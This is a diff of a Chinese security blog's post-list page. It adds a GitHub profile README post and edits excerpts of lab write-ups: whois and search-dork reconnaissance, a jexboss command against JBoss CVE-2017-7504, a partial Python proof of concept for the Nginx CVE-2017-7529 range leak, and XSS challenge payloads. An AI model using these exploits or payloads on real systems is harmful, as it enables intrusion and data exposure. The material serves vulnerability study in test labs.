@@ -76,6 +76,30 @@
 <article class=post-entry>
 <header class=entry-header>
 <h2>
+自定义GitHub个人资料
+</h2>
+</header>
+<section class=entry-content>
+<p>概述 想自定义一下GitHub的个人资料自述文件，遂有本文。
+官方文档:管理个人资料自述文件 - GitHub Docs
+关于自述文件:关于自述文件 - GitHub Docs
+基本要求 创建一个与用户名相同的公开仓库 仓库根目录包含README.md文件 README.md文件不能为空 实现步骤 1.添加个人资料自述文件 1.新建仓库 在任意页面点击右上角的+号创建一个与自己用户名相同的仓库。当输入自己的用户名时，会出现一个小彩蛋。
+2.添加仓库说明(可选) 3.设置仓库为公共属性 4.使用自述文件初始化仓库 5.创建仓库并编辑README文档 生成的自述文件已由模板预先填充，也可自定义表情、符号。
+表情符号清单:🎁 Emoji cheat sheet for GitHub, Basecamp, Slack & more (webfx.com)
+在想要换行的文本前后加上&lt;br>和&lt;/br>即可，如:
+&lt;br>This is test&lt;/br> 2.删除个人资料自述文件 以下任一满足，个人资料自述文件就将会被删除:
+自述文件为空或不存在 仓库为私有仓库 仓库名与用户名不匹配 本文链接:自定义GitHub个人资料 | Atmet (oopsdc.tk)
+文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
+</p>
+</section>
+<footer class=entry-footer>
+July 1, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;DaChui
+</footer>
+<a class=entry-link aria-label="post link to 自定义GitHub个人资料" href=https://oopsdc.tk/post/%E8%87%AA%E5%AE%9A%E4%B9%89github%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%96%99/></a>
+</article>
+<article class=post-entry>
+<header class=entry-header>
+<h2>
 信息收集
 </h2>
 </header>
@@ -86,17 +110,17 @@
 Whois命令查询 概念:Whois是一个标准互联网协议，可用于收集网络注册信息，如注册域名、IP等。
 原理:Whois就是一个用于查询域名是否被注册及注册域名详细信息的数据库。
 作用:获得注册人姓名和邮箱，通过社工进一步获取其它信息。
-用法:
-whois baidu.com 在线Whois查询网站:
+用法：
+whois baidu.com 在线Whois查询网站：
 站长工具_whois查询工具_爱站网 (aizhan.com)
 域名Whois查询 - 站长之家 (chinaz.com)
 VirusTotal
 2、查询备案信息 概念:网站备案是工具国家法律法规规定，需要网站所有者向国家有关部门申请的备案。这是国家信息产业部对网站的一种管理。
 注意:若网站搭建在其他国家，则不需进行备案。
-在线备案信息查询网站:
+在线备案信息查询网站：
 天眼查-商业查询平台_企业信息查询_公司查询_工商查询_企业信用信息系统 (tianyancha.com)
 3、收集敏感信息 搜索关键字 通过搜索引擎构造特殊关键字语法来搜索互联网上的相关敏感信息。还可用其来收集数据库文件、SQL注入、配置信息、源码泄露、未授权访问和robots.txt等敏感信息。
-常用搜索语法(各搜索引擎大同小异):
+常用搜索语法(各搜索引擎大同小异)：
 语法 作用 Site 指定域名 Inurl URL存在关键字的网页 Intext 网页正文中的关键字 Filetype 指定文件类型 Intitle 网页标题中的关键字 link link:baidu.com 表示返回所有和baidu.com做了链接的URL Info 查找指定站点的基本信息 cache 搜索Google中关于某些内容的缓存 一般可以把语法结合使用以获得更准确的信息。...</p>
 </section>
 <footer class=entry-footer>
@@ -113,8 +137,8 @@ JBoss漏洞复现
 <section class=entry-content>
 <p>JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504 漏洞描述 Red Hat JBoss Application Server是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JBossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，攻击者可借助特制的序列化数据利用该漏洞执行任意代码。
 影响版本 JBoss AS 4.x及之前。
-复现思路 漏洞复现 环境搭建:
-git clone https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose up -d Jexboss工具:joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool (github.com)
+复现思路 漏洞复现 环境搭建：
+git clone https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose up -d Jexboss工具：joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool (github.com)
 git clone https://github.com/joaomatosf/jexboss.git python3 jexboss.py -host http://&lt;ip>:8080 成功利用漏洞执行命令。
 本文链接:JBoss漏洞复现 | Atmet (oopsdc.tk)
 文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
@@ -135,9 +159,9 @@ Nginx漏洞复现
 <p>Nginx 越界读取缓存漏洞 CVE-2017-7529 漏洞描述 Nginx在反向代理站点的时候，通常会缓存一些文件，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括文件头+HTTP返回包头+HTTP返回包体。如果二次请求命中该缓存文件，Nginx会直接将该文件中的HTTP返回包体返回给用户。
 如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能读取到缓存文件中位于HTTP返回包体前的文件头、HTTP返回包头等内容。
 影响版本 Nginx 0.5.6 ~ 1.13.2
-复现思路 漏洞复现 环境搭建:
+复现思路 漏洞复现 环境搭建：
 git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d 访问:http://&lt;ip>:8080正常即可。
-POC已经在当前目录中给出来，文件名poc.py:
+POC已经在当前目录中给出来，文件名poc.py：
 #!/usr/bin/env python import sys import requests if len(sys.argv) &lt; 2: print("%surl" % (sys.argv[0])) print("eg: python %shttp://your-ip:8080/" % (sys.argv[0])) sys.exit() headers = { 'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240" } offset = 605 url = sys.argv[1] file_len = len(requests.get(url, headers=headers).content) n = file_len + offset headers['Range'] = "bytes=-%d,-%d" % ( n, 0x8000000000000000 - n) r = requests....</p>
 </section>
 <footer class=entry-footer>
@@ -205,41 +229,24 @@ XSS Challenges
 </h2>
 </header>
 <section class=entry-content>
-<p>题目地址:https://xss-quiz.int21h.jp/
+<p>题目地址：https://xss-quiz.int21h.jp/
 Stage #1 Hint: Very simple…
-直接输入测试语句:
+直接输入测试语句：
 &lt;sCript>alert(document.domain);&lt;/Script> Stage #2 Hint: Close the current tag and add SCRIPT tag…
-地址:XSS Challenges (by yamagata21) - Stage #2 (int21h.jp)
-上测试语句:
+地址：XSS Challenges (by yamagata21) - Stage #2 (int21h.jp)
+上测试语句：
 &lt;sCript>alert(document.domain);&lt;/Script> 然后审查元素，只需要把input标签闭合就能执行我们的语句了。
 ">&lt;sCript>alert(document.domain);&lt;/Script> Stage #3 Hint: The input in text box is properly escaped.
-地址:XSS Challenges (by yamagata21) - Stage #3 (int21h.jp)
+地址：XSS Challenges (by yamagata21) - Stage #3 (int21h.jp)
 这个页面有两个input标签，先在搜索框输入我们的测试语句试试。
 直接把我们的语句放到&lt;b>标签里了，但是这旁边不是还有一个input标签吗。把两者的name互换一下即可。
 Stage #4 Hint: Invisible input field.
-地址:XSS Challenges (by yamagata21) - Stage #4 (int21h....</p>
+地址：XSS Challenges (by yamagata21) - Stage #4 (int21h....</p>
 </section>
 <footer class=entry-footer>
 June 10, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;DaChui
 </footer>
 <a class=entry-link aria-label="post link to XSS Challenges" href=https://oopsdc.tk/post/xss-challenges/></a>
-</article>
-<article class=post-entry>
-<header class=entry-header>
-<h2>
-Test
-</h2>
-</header>
-<section class=entry-content>
-<p>He11o, th1s 1s a test!
-#include &lt;stdio.h>int main() { pritnf("Hello World!"); } 本文链接:Test | Atmet (oopsdc.tk)
-文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
-</p>
-</section>
-<footer class=entry-footer>
-May 28, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;DaChui
-</footer>
-<a class=entry-link aria-label="post link to Test" href=https://oopsdc.tk/post/test/></a>
 </article>
 <footer class=page-footer>
 <nav class=pagination>
